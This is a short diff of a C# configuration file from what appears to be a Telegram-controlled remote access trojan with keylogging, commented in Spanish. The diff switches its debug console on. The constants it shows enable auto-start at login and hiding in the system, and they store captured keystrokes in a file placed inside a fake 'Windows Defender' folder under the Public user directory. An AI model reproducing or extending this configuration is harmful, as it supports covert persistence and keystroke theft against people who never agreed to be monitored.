@@ -13,7 +13,7 @@
         public const bool   STARTUP = true;         // Se inicia automaticamente al iniciar sesión
         public const bool   TROJAN = true;          // Se oculta en el sistema
         public const int    DELAY = 1;              // Delay despues de iniciar el sistema // Para computadoras sin SSD // Segundos
-        public const bool   CONSOLE_DEBUG = false;   // Modo debug =>> Muestra consola al ejecutarse
+        public const bool   CONSOLE_DEBUG = true;   // Modo debug =>> Muestra consola al ejecutarse
 
         // Config de Trojan // No cambiar si no cambiaste el nombre del troyano
         // Esta información la encuentras en la carpeta = @"RAT TelegramSpyBot\bin\Debug"
@@ -26,8 +26,5 @@
         public const string PATH_LOG    = @"C:\Users\Public\Security\Windows Defender";  // Ruta donde se guardará el registro de teclas
         public const string LOG         = "reg.k";                          //Archivo registro.                   
         public const string PATH_KEY    = PATH_LOG+ @"\"+LOG;
-
-
-
     }
 }
